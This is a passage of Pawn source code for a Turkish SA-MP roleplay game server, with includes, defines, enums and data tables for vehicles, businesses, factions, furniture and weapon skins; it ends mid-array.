#include <a_samp>
#undef MAX_PLAYERS
#define MAX_PLAYERS 200
#include <zcmd>
#include <a_http>
#include <a_json>
#include <md5>
#include <renkler>
#include <sscanf2>
#include <JunkBuster>
#include <mSelection>
#include <a_mysql>
#include <cuffs>
#include <a_Campfire>
#include <strlib>
//#include <progress2>
//#include <mapandreas>
#include <mapfix>
#include <streamer>
#include <garage_block>
#include <seif_walk>
//#include <pause>
#include <cbug>
#include <bustaim>
#include <spikestrip>
//#include <foreach>
//#include <timerfix>
#include <crashdetect>
//#include <rnpc>
#include <colorcheckpoints>
//#include <FCNPC>
#include <gangzone>
#include <sdiag>
#include <easydialog>
#include <flycam>
#include <YSI_Coding\y_timers>
#include <YSI_Data\y_iterate>
#include <YSI_Coding\y_malloc>
#include <YSI_Coding\y_hooks>
//#include <c_textdraw>
//#include <discord-connector>
//#include <gmenu>

#include "src/utils/defines.pwn"
#include "src/utils/mysql.pwn"

#include "src/enums/main.pwn"

#include "src/utils/functions.pwn"
#include "src/utils/constants.pwn"

#include "src/modules/main.pwn"

#include "src/modules/LSPD/main.pwn"

#include "src/modules/commands/main.pwn"

#include "src/modules/admin/main.pwn"

native IsValidVehicle(vehicleid);
native gpci (playerid, serial [], len); // this is the native.

main()
{
}
/* KENDÝME NOT */
/*
Ýþyeri Tipleri:
1 - Market
2 - Pizza Restorant
3 - Burger Restorant
4 - Tavuk Restorant
5 - Bar
6 - Kýyafet Dükkaný
7 - Silah Dükkaný
8 - Depo
9 - Diðer
10 - Pay 'n SprayF
11 - Banka
12 - Mobilya Dükkaný
13 - (bunu atla)
14 - GYM
15 - GARAJ
16 - SEVKIYAT
17 - PawnShop
18 - Yeni Kýyafet Dükkaný
19 - Spor Dükkaný
20 - Galeri
21 - Süpersport Galeri
22 - Hafriyat
23 - Ofis
24 - Taksi Þirketi
25 - Otobüs Þirketi
26 - Kiralýk Araç Þirketi
27 - Hastane
28 - Benzin Ýstasyonu

Araç Tipleri:
1 - Sahibi olan araçlar
2 - Faction Araçlarý
3 - Sevkiyat Mesleði
4 - Taksicilik Mesleði
5 - Kiralýk Araç
6 - Pizza
7 - Araç Sicil Temizleme Ýllegal Mesleði
8 - Ehliyet
9 - Temizlik Mesleði
10 - Sevkiyat Aracý
11 - Kamyonet
12 - elektronik
13 - Lojistik
14 - Hafriyat Arac

Meslek:
2 - Taksici
6 - Otobüscü
7 - temizlik
8 - Hafriyat
9 - elektronik
10 - lojistik
*/
//________________________DEFINE________________________________________________

#define SDIALOG ""C7"EIGHTBORN - "C8"RolePlay"
#define DIALOG_GRAFFITI 384

//#define MAX_PL              1.0    // Max Packet Loss

// Damage sistemi
#define Head                        (5)
#define Torso                       (6)
#define Groin                       (7)
#define RArm                        (8)
#define LArm                        (9)
#define RLeg                        (10)
#define LLeg                        (11)

#define BODY_PART_TORSO             (3)
#define BODY_PART_HEAD              (9)
#define BODY_PART_GROIN             (4)
#define BODY_PART_LEFT_ARM          (5)
#define BODY_PART_RIGHT_ARM         (6)
#define BODY_PART_LEFT_LEG          (7)
#define BODY_PART_RIGHT_LEG         (8)

#define D_DAMAGES 689
#define MAX_BODY_PARTS 7
#define MAX_WEAPONS 55
// ==================== //

#define ATELEFON_MODEL 1216

#define CCTV_MODEL 2921
#define MAX_CCTV 30

#define campfiretime 600000
//#define Dialog_Paintball 9972

#define ADMIN_SPEC_TYPE_NONE 0
#define ADMIN_SPEC_TYPE_PLAYER 1
#define ADMIN_SPEC_TYPE_VEHICLE 2

#define DIALOG_RENK1 901
#define DIALOG_NEON 902
#define DIALOG_PAINTJOB 903
#define DIALOG_EGZOZ 904
#define DIALOG_ONTAMPON 905
#define DIALOG_ARKATAMPON 906
#define DIALOG_TEPE 907
#define DIALOG_SPOILER 908
#define DIALOG_YANKENAR 909
#define DIALOG_FARLAR 910
#define DIALOG_TEKERLEK 911
#define DIALOG_SESSISTEMI 912
#define DIALOG_HIDROLIK 913
#define DIALOG_NITRO 914

//Ateþ Kampý
#define TEXTURE_1	2068,	"cj_ammo_net",		"CJ_cammonet"
#define TEXTURE_2	693,	"gta_tree_pine",	"sm_redwood_branch"
#define TEXTURE_3	693,	"gta_tree_pine",	"sm_pinetreebit"
#define DEFAULT		TEXTURE_2

//KAR
#define MAX_SNOW_OBJECTS    8
#define UPDATE_INTERVAL     750

#define PlayerToPoint(%1,%2,%3) IsPlayerInRangeOfPoint(%2,%1,%3)
#define ResetMoneyBar ResetPlayerMoney

#define INDEX_TELEFON 8 // SetPlayerAttachedObject(playerid,INDEX_TELEFON,18865,6,0.096000,0.009000,-0.008000,75.399963,179.899902,0.000000,1.000000,1.000000,1.000000)
#define ARMOUR_INDEX 4
#define KASK_INDEX 3

//#define 				strcpy(%0,%1,%2) 						strcat((%0[0] = '\0', %0), %1, %2) // strcpy(dest, source, length)

//DONDUR - COZ
#define DONDUR(%0) TogglePlayerControllable(%0, false)
#define COZ(%0) TogglePlayerControllable(%0, true)

//PD FLASH
#define flashtime 115

#define MAX_PLAYER_BLEEDS														(3)
#define PLAYER_BLEEDING_RANGE													(1.5)

//________________________ENUM TANITIMLARI______________________________________

#define MAX_BARIKAT 		(200)
#define MAX_CEKIMNOKTA      (150)

enum mgy
{
	Float:mgirx,
	Float:mgiry,
	Float:mgirz,
}
//yaptým
//new lastsilahyerid;
enum aVeriler
{
	ModPaintjob,
	ModSpoiler,
	ModRoof,
	ModLeftSideSkirt,
	ModRightSideSkirt,
	ModExhaust,
	ModWheels,
	ModFrontBumper,
	ModRearBumper,
	ModStereo,
	ModHydraulics,
	ModNitro,
}

#define MAX_GARAJ 100
enum garajenum
{
	gid,
	Float:gx,
	Float:gy,
	Float:gz,
	gint,
	gvw,
	gicint,
	gsahip,
	gbirlik,
	gisim[32],
	Text3D:glabel,
	gpickup,
	gkilit,
	Float:gax,
	Float:gay,
	Float:gaz,
	Float:garz,
}
new Garaj[MAX_GARAJ][garajenum];

#define MAX_GPS 500
enum gpsenum
{
	gid,
	Float:gx,
	Float:gy,
	Float:gz,
	gekleyen,
	gisim[32],
	Text3D:glabel,
}
new Gps[MAX_GPS][gpsenum];

#define MAX_GATE 500
enum gatenum
{
	gid,
	gmodel,
	gint,
	gvw,
	Float:gx,
	Float:gy,
	Float:gz,
	Float:grx,
	Float:gry,
	Float:grz,
	Float:gox,
	Float:goy,
	Float:goz,
	Float:gorx,
	Float:gory,
	Float:gorz,
	gsahip,
	gbirlik,
	gtmodel,
	gtname1[32],
	gtname2[32],
	gobje,
	PlayerText3D:glabel,
	gdurum,
}
new Gate[MAX_GATE][gatenum];

#define MAX_ACTOR 50
enum actorenum
{
	aid,
	aisim[32],
	askin,
	avw,
	aint,
	Float:ax,
	Float:aay,
	Float:az,
	Float:arz,
	aanim[255],
	arenk,
	Text3D:adtext,
	aactor,
}
new Actor[MAX_ACTOR][actorenum];

#define MAX_MOBILYA 3000
enum mobilyaenum
{
	mid,
	mevid,
	mmodel,
	Float:mx,
	Float:my,
	Float:mz,
	Float:mrx,
	Float:mry,
	Float:mrz,
	Float:mox,
	Float:moy,
	Float:moz,
	Float:morx,
	Float:mory,
	Float:morz,
	mint,
	mvw,
	mtexture[2],
	mtexturerenk[2],
	mobje,
	PlayerText3D:mlabel,
	maracid,
}
new Mobilya[MAX_MOBILYA][mobilyaenum];

new walls = mS_INVALID_LISTID;
new doors2 = mS_INVALID_LISTID;
new chairs = mS_INVALID_LISTID;
new tables = mS_INVALID_LISTID;
new fitness = mS_INVALID_LISTID;
new lights2 = mS_INVALID_LISTID;
new eletronic = mS_INVALID_LISTID;
new bathroom = mS_INVALID_LISTID;
new kitchen = mS_INVALID_LISTID;
new beds = mS_INVALID_LISTID;

#define MAX_SILAHYER 5000
enum silahyerenums
{
	syid,
	Float:syposx,
	Float:syposy,
	Float:syposz,
	Float:syposa,
	syinterior,
	syvworld,
	sysilah,
	symermi,
	Float:syposrx,
	Float:syposry,
	Float:syposrz,
	syobject,
}
new SilahYer[MAX_SILAHYER][silahyerenums];
new Iterator:GunsGround<MAX_SILAHYER>;

enum atmlerenums
{
	atmid,
	Float:atmx,
	Float:atmy,
	Float:atmz,
	Float:atmrx,
	Float:atmry,
	Float:atmrz,
	atmint,
	atmvw,
	atmobje
}
new ATM[MAX_ATM][atmlerenums];

enum barikat
{
	buniqueid,
	o_id,
	d_id,
	model,
	Float:bx,
	Float:by,
	Float:bz,
	Float:brx,
	Float:bry,
	Float:brz,
	OlusturanIsim[25],
	DuzenleyenIsim[25],
	StreamerID
}
new Barikat[MAX_BARIKAT][barikat];

enum DataPlayer
{
	BleedObject[MAX_PLAYER_BLEEDS]
}
new PlayerData[MAX_PLAYERS][DataPlayer];

enum interiorenums
{
	interiorid,
	intisim[24],
	Float:intx,
	Float:inty,
	Float:intz,
	Float:intangle,
	intint,
	inttur,
	intfiyat,
}

new Interior[MAX_INTERIORS][interiorenums];

enum uyusturucuenums
{
	uid,
	utip,
	udurum,
	udakika,
	Float:ux,
	Float:uy,
	Float:uz,
	uinterior,
	uvworld,
	uobje,
	Text3D:ulabel,
}
new Uyusturucu[MAX_DRUGS][uyusturucuenums];

enum objenum
{
	oid,
	omodel,
	oint,
	ovw,
	Float:ox,
	Float:oy,
	Float:oz,
	Float:orx,
	Float:ory,
	Float:orz,
	otmodel,
	otname1[32],
	otname2[32],
	oobje,
	PlayerText3D:glabel,
}
new Obje[MAX_OBJE][objenum];

enum HARITA_MAIN {
	HARITA_ISIM[28],
	Float:HARITA_POS[6]
};

enum grups
{
	gid,
	lider,
	gisim[32],
}
new Grup[MAX_GRUP][grups];
enum mdcenum
{
	MDCAranan[128],
	MDCSuc[256],
	MDCMemur[MAX_PLAYER_NAME+1],
	MDCTip,
	MDCTarih[256],
}
new MDCAranma[MAX_MDCARANMA][mdcenum];
enum aracenums
{
	aid,
	amodel,
	SirenD,
	SirenObje,
	Float:aposx,
	Float:aposy,
	Float:aposz,
	Float:aposa,
	ainterior,
	avworld,
	arenk1,
	arenk2,
	siren,
	aowner,
	Float:ahasar,
	atip,
	afiyat,
	aspawn,
	aspawnsatin,
	aplaka[32],
	akilit,
	akilittip,
	aalarm,
	aimmo,
	Float:abenzin,
	aceza[32],
	acezamiktar,
	apaintjob,
	aexhaust,
	afrontbumper,
	arearbumper,
	aroof,
	aspoilers,
	asideskirts,
	abullbars,
	atekerlek,
	acarstereo,
	ahidrolik,
	anitro,
	apanels,
	adoors,
	alights,
	atires,
	yedekanahtar,
	akm,
	ametre,
	atextdurum,
	atextyazi[32],
	abirlik,
	abirliktip,
	asure,
	aneon,
	//yaptým
	silah1,
	mermi1,
	silah2,
	mermi2,
	silah3,
	mermi3,
	ahizsabit,
	abenzintip,
	arutbe,
	vergi,
	aisyeri,
	agelir,
	birlikdestek,
	sigorta,
	parcalandi,
	ahurda
	//yaptým fin
}
new Arac[MAX_VEHICLES][aracenums];

enum matenum
{
	A,
	B,
	C,
	D,
	E,
}
new Materyal[MAX_VEHICLES][matenum];

enum auenum
{
	esrar,
	amfetamin,
	metamfetamin,
	lsd,
	extacy,
	kokain,
	eroin,
	morfin,
	MDA,
}
new AUyusturucu[MAX_VEHICLES][auenum];

enum bistasyonenums
{
	bID,
	Float:bPosX,
	Float:bPosY,
	Float:bPosZ,
	bDurum, //ileride kullanýlabilir(düþünce: benzin istasyonlarýnda bulunan marketler satýn alýndýðýnda mesela istasyondan benzin alýmýný açma/kapama gibi.)
}
new Benzinistasyonu[MAX_BENZIN_ISTASYONU][bistasyonenums];

new MobilyaFiyatlari[][] = {
	{2863, 10},
	{2864, 10},
	{2865, 10},
	{2823, 10},
	{2848, 10},
	{2849, 10},
	{2850, 10},
	{2851, 10},
	{2857, 10},
	{2858, 10},
	{2859, 10},
	{2860, 10},
	{2862, 10},
};

new ColorList[][121] =
{
    "{000000}000 {F5F5F5}001 {2A77A1}002 {840410}003 {263739}004 {86446E}005 {D78E10}006 {4C75B7}007 {BDBEC6}008 {5E7072}009\n",
    "{46597A}010 {656A79}011 {5D7E8D}012 {58595A}013 {D6DAD6}014 {9CA1A3}015 {335F3F}016 {730E1A}017 {7B0A2A}018 {9F9D94}019\n",
    "{3B4E78}020 {732E3E}021 {691E3B}022 {96918C}023 {515459}024 {3F3E45}025 {A5A9A7}026 {635C5A}027 {3D4A68}028 {979592}029\n",
    "{421F21}030 {5F272B}031 {8494AB}032 {767B7C}033 {646464}034 {5A5752}035 {252527}036 {2D3A35}037 {93A396}038 {6D7A88}039\n",
    "{221918}040 {6F675F}041 {7C1C2A}042 {5F0A15}043 {193826}044 {5D1B20}045 {9D9872}046 {7A7560}047 {989586}048 {ADB0B0}049\n",
    "{848988}050 {304F45}051 {4D6268}052 {162248}053 {272F4B}054 {7D6256}055 {9EA4AB}056 {9C8D71}057 {6D1822}058 {4E6881}059\n",
    "{9C9C98}060 {917347}061 {661C26}062 {949D9F}063 {A4A7A5}064 {8E8C46}065 {341A1E}066 {6A7A8C}067 {AAAD8E}068 {AB988F}069\n",
    "{851F2E}070 {6F8297}071 {585853}072 {9AA790}073 {601A23}074 {20202C}075 {A4A096}076 {AA9D84}077 {78222B}078 {0E316D}079\n",
    "{722A3F}080 {7B715E}081 {741D28}082 {1E2E32}083 {4D322F}084 {7C1B44}085 {2E5B20}086 {395A83}087 {6D2837}088 {A7A28F}089\n",
    "{AFB1B1}090 {364155}091 {6D6C6E}092 {0F6A89}093 {204B6B}094 {2B3E57}095 {9B9F9D}096 {6C8495}097 {4D8495}098 {AE9B7F}099\n",
    "{406C8F}100 {1F253B}101 {AB9276}102 {134573}103 {96816C}104 {64686A}105 {105082}106 {A19983}107 {385694}108 {525661}109\n",
    "{7F6956}110 {8C929A}111 {596E87}112 {473532}113 {44624F}114 {730A27}115 {223457}116 {640D1B}117 {A3ADC6}118 {695853}119\n",
    "{9B8B80}120 {620B1C}121 {5B5D5E}122 {624428}123 {731827}124 {1B376D}125 {EC6AAE}126 {000000}127 {177517}128 {210606}129\n",
    "{125478}130 {452A0D}131 {571E1E}132 {010701}133 {25225A}134 {2C89AA}135 {8A4DBD}136 {35963A}137 {B7B7B7}138 {464C8D}139\n",
    "{84888C}140 {817867}141 {817A26}142 {6A506F}143 {583E6F}144 {8CB972}145 {824F78}146 {6D276A}147 {1E1D13}148 {1E1306}149\n",
    "{1F2518}150 {2C4531}151 {1E4C99}152 {2E5F43}153 {1E9948}154 {1E9999}155 {999976}156 {7C8499}157 {992E1E}158 {2C1E08}159\n",
    "{142407}160 {993E4D}161 {1E4C99}162 {198181}163 {1A292A}164 {16616F}165 {1B6687}166 {6C3F99}167 {481A0E}168 {7A7399}169\n",
    "{746D99}170 {53387E}171 {222407}172 {3E190C}173 {46210E}174 {991E1E}175 {8D4C8D}176 {805B80}177 {7B3E7E}178 {3C1737}179\n",
    "{733517}180 {781818}181 {83341A}182 {8E2F1C}183 {7E3E53}184 {7C6D7C}185 {020C02}186 {072407}187 {163012}188 {16301B}189\n",
    "{642B4F}190 {368452}191 {999590}192 {818D96}193 {99991E}194 {7F994C}195 {839292}196 {788222}197 {2B3C99}198 {3A3A0B}199\n",
    "{8A794E}200 {0E1F49}201 {15371C}202 {15273A}203 {375775}204 {060820}205 {071326}206 {20394B}207 {2C5089}208 {15426C}209\n",
    "{103250}210 {241663}211 {692015}212 {8C8D94}213 {516013}214 {090F02}215 {8C573A}216 {52888E}217 {995C52}218 {99581E}219\n",
    "{993A63}220 {998F4E}221 {99311E}222 {0D1842}223 {521E1E}224 {42420D}225 {4C991E}226 {082A1D}227 {96821D}228 {197F19}229\n",
    "{3B141F}230 {745217}231 {893F8D}232 {7E1A6C}233 {0B370B}234 {27450D}235 {071F24}236 {784573}237 {8A653A}238 {732617}239\n",
    "{319490}240 {56941D}241 {59163D}242 {1B8A2F}243 {38160B}244 {041804}245 {355D8E}246 {2E3F5B}247 {561A28}248 {4E0E27}249\n",
    "{706C67}250 {3B3E42}251 {2E2D33}252 {7B7E7D}253 {4A4442}254 {28344E}255\n"
};

enum secimler
{
	secid,
	sarah,
	marshall,
}
new Secim[secimler];

enum evuyusturucuenum
{
	amfetamin,
	metamfetamin,
	lsd,
	extacy,
	eroin,
	kokain,
	morfin,
	uesrar,
	MDA
}
new EvUyusturucu[MAX_EV][evuyusturucuenum];

enum GraffitiDegiskenleri
{
	gID,
	gYapan,
	Float: gPos[3],
	Float: gRot[3],
	gYazi[128],
	gFont[128],
	gRenk,
	gInt,
	gVW,
	gObje,
	MateryalBoyut,
	FontBoyut,
	FontBold2,
	Ortala,
}
new Graffitiler[MAX_GRAFFITI][GraffitiDegiskenleri];

enum soygunenum
{
	lider,
	oyuncu2,
	oyuncu3,
	oyuncu4,
	oyuncu5,
	isyerid,
	isyeritip,
};
new Soygun[MAX_SOYGUN][soygunenum];

enum ihbarenum
{
	ihbarveren,
	ihbarno,
	ihbartext[256],
	ihbartarih[256],
};
new Ihbar[MAX_IHBAR][ihbarenum];

enum npcenum
{
	nsahip,
	nsure,
	ntip,
	nskin,
	nanim,
	nid,
	nrenk,
	nad[32],
	Text3D:nadtext,
	Text3D:nyazitext
};
new NPC[MAX_NPC][npcenum];

enum cctvenum
{
	c_id,
	Float:c_px,
	Float:c_py,
	Float:c_pz,
	Float:c_rx,
	Float:c_ry,
	Float:c_rz,
	c_int,
	c_vw,
	c_name[64+1],
	c_object,
	c_angle
};
new CCTV[MAX_CCTV][cctvenum];

enum atelefonenum
{
	a_id,
	Float:a_x,
	Float:a_y,
	Float:a_z,
	Float:a_rx,
	Float:a_ry,
	Float:a_rz,
	a_object,
	Text3D:a_textlabel
};
new ATelefon[MAX_ANKESORLU_TELEFON][atelefonenum];

new StripSkin[] = { 63, 85, 152, 237, 257 };
new BarmenSkin[] = { 11, 171, 172, 189, 217 };
new GuvenlikSkin[] = { 24, 25, 71, 163, 164 };

enum ekipenum {
	no,
	etip,
	oyuncu_1,
	oyuncu_2
};
new Ekip[MAX_EKIP][ekipenum];

new Textures[][] = {
	{-1, "none"},
	{1675, "wshxrefhse"},
	{13691,	"bevcunto2_lahills"},
	//{13007, "sw_bankint"},
	{16150, "ufo_bar"},
	{18202, "w_towncs_t"},
	{4600, "theatrelan2"},
	{8390, "vegasemulticar"},
	{16150, "ufo_bar"},
	{18265, "w_town3cs_t"},
	{13691,	"bevcunto2_lahills"},
	{9953, "ottos_sfw"}
};

new Textures2[][] = {
	{-1, "none"},
	{1675, "duskyblue_128"},
	{13691, "Heliconcrete"},
	//{13007, "woodfloor1"},
	{16150, "dinerfloor01_128"},
	{18202, "concretebig4256128"},
	{4600, "gm_labuld2_b"},
	{8390, "ws_mixedbrick"},
	{16150, "sa_wood08_128"},
	{18265, "ws_redbrickold"},
	{13691,	"newgrnd1brn_128"},
	{9953, "carshowroomfloor"}
};

new TextureColor[] = {
	0xFF468499,
	0xFF800080,
	0xFF800000,
	0xFF808080,
	0xFFdaa520,
	0xFF31698a,
	0xFF6dc066,
	0xFFff7f50,
 	0xFFd64d4d,
 	0xFF6b3e26
};

enum kapienum {otip,osahip,bool:kilitli,osure};
new Otel[240][kapienum];

new Float:OtelKapiPos[12][3] = {
    {1465.8578,-1517.3196,3306.0044},
    {1465.8672,-1520.6708,3306.0044},
    {1473.3696,-1517.1115,3306.0044},
    {1473.3243,-1520.6719,3306.0044},
    {1480.7139,-1517.1139,3306.0044},
    {1480.7595,-1520.6682,3306.0044},
    {1498.3020,-1517.1089,3306.0044},
    {1498.3021,-1520.6709,3306.0044},
    {1505.7712,-1517.1089,3306.0044},
    {1505.7343,-1520.6705,3306.0044},
    {1513.1290,-1517.1140,3306.0044},
    {1513.1215,-1520.6714,3306.0044}
};

new Float:OtelOdaPos[3][4] = {
    {1514.0164, -1544.0965, 3481.0859, 360.0},
    {2237.3115, -1081.2393, 1049.0234, 360.0},
    {1314.1879, -1096.0391, -20.5890, 90.0}
};
new OtelOdaInterior[3] = { 1, 2, 1 };

new Float:MermiPozisyonlari[4][5] = {
	{1403.7571, -1299.2189, 13.5460, 0.0, 0.0},
	{836.9, 2725.4, 795.6, 1.0, 729.0},
	{-525.4, -506.0, 25.52, 0.0, 0.0},
	{811.1, -564.52, 16.33, 0.0, 0.0}
};

//GYM SISTEMI
new bool:pCBugging[MAX_PLAYERS];

// **** TIMERS

new ptmCBugFreezeOver[MAX_PLAYERS];

// **** TIMESTAMPS

new ptsLastFiredWeapon[MAX_PLAYERS];
//
new bool:pTwoShotting[MAX_PLAYERS],
pLastBulletAmount[MAX_PLAYERS],
bool:pFiredSawnoff[MAX_PLAYERS],
bool:pAttemptingTwoShot[MAX_PLAYERS];

// **** TIMERS

new ptmTwoShotFreezeOver[MAX_PLAYERS];

// **** TIMESTAMPS

new ptsAttemptingToBypassSystem[MAX_PLAYERS];

enum KarakterOzellikEnum {Liderlik, Guc, Pazarlik, Ustalik};
new const KarakterOzellik[MAX_PLAYERS][KarakterOzellikEnum];

enum FactionTypesEnum {Type, Name[16], Cost};
new const FactionTypes[][FactionTypesEnum] = {
	{LEGAL, "Legal", 0},
	{CETE, "Çete", 10000},
	{MC, "MC", 10000},
	{MAFYA, "Mafya", 15000},
	{YARIS, "Yarýþ", 10000},
	{ASMS, "Hastane", 75000},
	{SANTV, "Haber", 1500000}
};

enum FactionStarsEnum {Type, Star2Cost, Star2User, Star3Cost, Star3User, Star4Cost, Star4User, Star5Cost, Star5User};
new const FactionStars[][FactionStarsEnum] = {
	{CETE, 25000, 5, 150000, 25, 500000, 35, 1000000, 40},
	{MC, 25000, 5, 150000, 25, 500000, 35, 1000000, 40},
	{MAFYA, 25000, 5, 150000, 25, 500000, 35, 1000000, 40},
	{YARIS, 25000, 5, 175000, 15}
};

enum GunEnum {Name[64], ID};
new const GunSQLNames[][GunEnum] = {
	{"glockBlack", -2006},
	{"glockGold", -2011},
	{"ak47Silver", -2012},
	{"deagleGold", -2013},
	{"ak47gold", -2014},
	{"ak47black", -2017},
	{"deagleSilver", -2019},
	{"balta", -2018}
};

new const GunNames[][GunEnum] = {
	{"Býçak", 4},
	{"Sopa", 5},
 	{"Colt45", 22},
 	{"Deagle", 24},
  	{"Uzi", 28},
  	{"MP5", 29},
  	{"AK-47", 30},
    {"M4", 31},
    {"Tec-9", 32}
};

new const GunSkins[9][5] = {
	{4, 335, -2018},
	{5, 336},
 	{22, 346, -2006, -2011},
 	{24, 348, -2013, -2019},
  	{28, 352},
  	{29, 353},
  	{30, 355, -2017, -2012, -2014},
    {31, 356},
    {32, 372}
};

new const GunSkinsNames[][GunEnum] = {
	{"Býçak Orjinal", 335},
	{"Sopa Orjinal", 336},
	{"Colt45 Orjinal", 346},
 	{"Deagle Orjinal", 348},
 	{"Uzi Orjinal", 352},
  	{"MP5 Orjinal", 353},
  	{"AK-47 Orjinal", 355},
    {"M4 Orjinal", 356},
    {"Tec-9 Orjinal", 372},
	{"Colt45 Black", -2006},
	{"Colt45 Gold", -2011},
	{"AK47 Black", -2017},
	{"AK47 Silver", -2012},
	{"AK47 Gold", -2014},
	{"Deagle Gold", -2013},
	{"Deagle Silver", -2019},
	{"Balta", -2018}
};

enum GunOffset {ModelID, Float:goX, Float:goY, Float:goZ, Float:grX, Float:grY, Float:grZ, Float:gsX, Float:gsY, Float:gsZ};
new Float:GunSkinsOffset[][GunOffset] = {
	{-2006, -0.0120, -0.0100, -0.0009, 0.1999, 1.4000, -2.3999, 1.0860, 1.6960, 1.1050}, // Colt45 Black
	{-2011, -0.0120, -0.0100, -0.0009, 0.1999, 1.4000, -2.3999, 1.0860, 1.6960, 1.1050}, // Colt45 Gold
	{-2012, 0.0079, -0.0070, -0.0000, 0.0997, 0.0000, 1.6000, 0.9809, 1.2450, 1.0068}, // AK47 Silver
	{-2014, 0.0079, -0.0070, -0.0000, 0.0997, 0.0000, 1.6000, 0.9809, 1.2450, 1.0068}, // AK47 Gold
	{-2017, 0.0079, -0.0070, -0.0000, 0.0997, 0.0000, 1.6000, 0.9809, 1.2450, 1.0068}, // AK47 Black
	{-2013, -0.0009, -0.0000, -0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000}, // Deagle Gold
	{-2018, -0.0130, -0.0040, 0.0300, 0.0000, 0.0000, 0.0000, 1.1550, 1.1069, 1.2220}, // Balta
	{-2019, -0.0009, -0.0000, -0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000} // Deagle Gold
	//{-2016, 0.0379, -0.0190, -0.0199, 0.000000, 1.5999, 2.5999, 1.1080, 1.7259, 1.1779} // Uzi Gold eklenmedi
};

static const SkinNames[][] =
{
	"cj", "truth", "maccer", "andre", "bbthin", "bb", "emmet", "male01",
	"janitor", "bfori", "bfost", "vbfycrp", "bfyri", "bfyst", "bmori", "bmost",
	"bmyap", "bmybu", "bmybe", "bmydj", "bmyri", "bmycr", "bmyst", "wmybmx",
	"wbdyg1", "wbdyg2", "wmybp", "wmycon", "bmydrug", "wmydrug", "hmydrug",
	"dwfolc", "dwmolc1", "dwmolc2", "dwmylc1", "hmogar", "wmygol1", "wmygol2",
	"hfori", "hfost", "hfyri", "hfyst", "jethro", "hmori", "hmost", "hmybe",
	"hmyri", "hmycr", "hmyst", "omokung", "wmymech", "bmymoun", "wmymoun",
	"ofori", "ofost", "ofyri", "ofyst", "omori", "omost", "omyri", "omyst",
	"wmyplt", "wmopj", "bfypro", "hfypro", "kendl", "bmypol1", "bmypol2",
	"wmoprea", "sbfyst", "wmosci", "wmysgrd", "swmyhp1", "swmyhp2", "",
	"swfopro", "wfystew", "swmotr1", "wmotr1", "bmotr1", "vbmybox", "vwmybox",
	"vhmyelv", "vbmyelv", "vimyelv", "vwfypro", "ryder3", "vwfyst1", "wfori",
	"wfost", "wfyjg", "wfyri", "wfyro", "wfyst", "wmori", "wmost", "wmyjg",
	"wmylg", "wmyri", "wmyro", "wmycr", "wmyst", "ballas1", "ballas2",
	"ballas3", "fam1", "fam2", "fam3", "lsv1", "lsv2", "lsv3", "maffa", "maffb",
	"mafboss", "vla1", "vla2", "vla3", "triada", "triadb", "sindaco", "triboss",
	"dnb1", "dnb2", "dnb3", "vmaff1", "vmaff2", "vmaff3", "vmaff4", "dnmylc",
	"dnfolc1", "dnfolc2", "dnfylc", "dnmolc1", "dnmolc2", "sbmotr2", "swmotr2",
	"sbmytr3", "swmotr3", "wfybe", "bfybe", "hfybe", "sofybu", "sbmyst",
	"sbmycr", "bmycg", "wfycrk", "hmycm", "wmybu", "bfybu", "smokev", "wfybu",
	"dwfylc1", "wfypro", "wmyconb", "wmybe", "wmypizz", "bmobar", "cwfyhb",
	"cwmofr", "cwmohb1", "cwmohb2", "cwmyfr", "cwmyhb1", "bmyboun", "wmyboun",
	"wmomib", "bmymib", "wmybell", "bmochil", "sofyri", "somyst", "vwmybjd",
	"vwfycrp", "sfr1", "sfr2", "sfr3", "bmybar", "wmybar", "wfysex", "wmyammo",
	"bmytatt", "vwmycr", "vbmocd", "vbmycr", "vhmycr", "sbmyri", "somyri",
	"somybu", "swmyst", "wmyva", "copgrl3", "gungrl3", "mecgrl3", "nurgrl3",
	"crogrl3", "gangrl3", "cwfofr", "cwfohb", "cwfyfr1", "cwfyfr2", "cwmyhb2",
	"dwfylc2", "dwmylc2", "omykara", "wmykara", "wfyburg", "vwmycd", "vhfypro",
	"suzie", "omonood", "omoboat", "wfyclot", "vwmotr1", "vwmotr2", "vwfywai",
	"sbfori", "swfyri", "wmyclot", "sbfost", "sbfyri", "sbmocd", "sbmori",
	"sbmost", "shmycr", "sofori", "sofost", "sofyst", "somobu", "somori",
	"somost", "swmotr5", "swfori", "swfost", "swfyst", "swmocd", "swmori",
	"swmost", "shfypro", "sbfypro", "swmotr4", "swmyri", "smyst", "smyst2",
	"sfypro", "vbfyst2", "vbfypro", "vhfyst3", "bikera", "bikerb", "bmypimp",
	"swmycr", "wfylg", "wmyva2", "bmosec", "bikdrug", "wmych", "sbfystr",
	"swfystr", "heck1", "heck2", "bmycon", "wmycd1", "bmocd", "vwfywa2",
	"wmoice", "tenpen", "pulaski", "hern", "dwayne", "smoke", "sweet", "ryder",
	"forelli", "tbone", "laemt1", "lvemt1", "sfemt1", "lafd1", "lvfd1", "sffd1",
	"lapd1", "sfpd1", "lvpd1", "csher", "lapdm1", "swat", "fbi", "army",
	"dsher", "zero", "rose", "paul", "cesar", "ogloc", "wuzimu", "torino",
	"jizzy", "maddogg", "cat", "claude", "lapdna", "sfpdna", "lvpdna", "lapdpc",
	"lapdpd", "lvpdpc", "wfyclpd", "vbfycpd", "wfyclem", "wfycllv", "csherna",
	"dsherna"
};

new MaxSeats[212] = {
	4,2,2,2,4,4,1,2,2,4,2,2,2,4,2,2,4,2,4,2,4,4,2,2,2,1,4,4,4,2,1,9,1,2,2,1,2,9,4,2,
	4,1,2,2,2,4,1,2,1,6,1,2,1,1,1,2,2,2,4,4,2,2,2,2,2,2,4,4,2,2,4,2,1,1,2,2,1,2,2,4,
	2,1,4,3,1,1,1,4,2,2,4,2,4,1,2,2,2,4,4,2,2,2,2,2,2,2,2,4,2,1,1,2,1,1,2,2,4,2,2,1,
	1,2,2,2,2,2,2,2,2,4,1,1,1,2,2,2,2,0,0,1,4,2,2,2,2,2,4,4,2,2,4,4,2,1,2,2,2,2,2,2,
	4,4,2,2,1,2,4,4,1,0,0,1,1,2,1,2,2,2,2,4,4,2,4,1,1,4,2,2,2,2,6,1,2,2,2,1,4,4,4,2,
	2,2,2,2,4,2,1,1,1,4,1,1
};

new GaleriListe[] = {
	445,602,
	499,581,536,496,401,422,575,498,609,518,482,
	527,483,542,589,
	507,562,585,419,587,
	462,521,533,565,463,526,
	466,492,
	474,588,
	546,
	559,508,
	400,
	517,410,551,500,423,418,414,
	516,582,
	462,
	461,404,600,426,436,547,413,
